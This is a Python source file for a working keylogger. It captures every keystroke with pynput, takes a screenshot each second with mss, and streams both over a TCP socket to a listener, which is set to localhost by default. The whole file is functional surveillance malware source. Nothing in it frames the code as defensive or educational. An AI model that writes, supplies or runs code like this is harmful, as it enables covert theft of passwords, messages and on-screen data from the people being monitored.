import socket
import time
import threading
from pynput import keyboard
import mss
from datetime import datetime
import struct

s_port = 9999
s_host = 'localhost'

class Keylogger:
	def __init__(self, host=s_host, port=s_port):
		# Initialize the Keylogger with the specified host and port
		self.host = host  # Host address for the listener
		self.port = port  # Port number for the connection
		self.client = None  # Placeholder for the client socket

	def connect(self):
		# Establish a connection to the listener
		self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Create a TCP/IP socket
		self.client.connect((self.host, self.port))  # Connect to the specified host and port

	def send_keystroke(self, key):
		'''Send the keystroke to the listener.'''
		try:
			# Attempt to encode the character of the key pressed
			message = f'{key.char}\n'.encode('utf-8')  # Key event without prefix
		except AttributeError:
			# Handle special keys (e.g., function keys, Ctrl, etc.)
			message = f'{key}\n'.encode('utf-8')  # Convert the special key to a string

		try:
			# Send the size of the message followed by the message itself
			self.client.sendall(struct.pack('!I', len(message)) + message)  # Send size + message
			# Log the sent key for debugging purposes
			print(f'Sent key: {message.decode("utf-8").strip()}')  # Debugging line
		except Exception as e:
			# Print any errors that occur during sending
			print(f'Error sending keystroke: {e}')

	def take_screenshot(self):
		'''Capture a screenshot and send it to the listener.'''
		with mss.mss() as sct:
			# Capture a screenshot of the primary monitor (adjust index if necessary)
			screenshot = sct.grab(sct.monitors[1])  
			# Convert the screenshot to PNG format
			img_data = mss.tools.to_png(screenshot.rgb, screenshot.size)

			# Get the size of the image data
			img_size = len(img_data)
			# Send the size of the image data followed by the image data itself
			self.client.sendall(struct.pack('!I', img_size) + img_data)  # Send size + image data

	def on_press(self, key):
		# Callback function that is called when a key is pressed
		print(f'Key pressed: {key}')  # Log the key pressed for debugging
		self.send_keystroke(key)  # Send the pressed key to the listener

	def start(self):
		'''Start the keylogger.'''
		self.connect()  # Establish connection to the listener
		# Start the screenshot capturing in a separate thread to avoid blocking
		threading.Thread(target=self.screenshot_loop, daemon=True).start()
		# Start listening for keyboard events
		with keyboard.Listener(on_press=self.on_press) as listener:
			listener.join()  # Keep the listener running until manually stopped

	def screenshot_loop(self):
		# Capture a screenshot every 5 seconds
		ss_interval = 1
		while True:
			time.sleep(ss_interval)  # Wait for ss_interval seconds before taking the next screenshot
			self.take_screenshot()  # Capture and send the screenshot

if __name__ == '__main__':
	keylogger = Keylogger()  # Create an instance of the Keylogger
	keylogger.start()  # Start the keylogger